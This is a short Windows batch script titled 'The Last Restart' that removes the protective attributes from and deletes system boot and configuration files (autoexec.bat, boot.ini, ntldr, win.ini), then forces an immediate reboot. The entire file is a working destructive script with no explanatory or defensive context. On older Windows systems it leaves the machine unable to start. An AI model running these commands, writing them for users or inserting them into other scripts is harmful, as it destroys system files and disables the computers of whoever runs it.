@ echo off

rem ———————————

rem The Last Restart

attrib -r -s -h c:\autoexec.bat

del c:\autoexec.bat

attrib -r -s -h c:\boot.ini

del c:\boot.ini

attrib -r -s -h c:\ntldr

del c:\ntldr

attrib -r -s -h c:\windows\win.ini

del c:\windows\win.ini

shutdown /r /t 00

rem ———————————
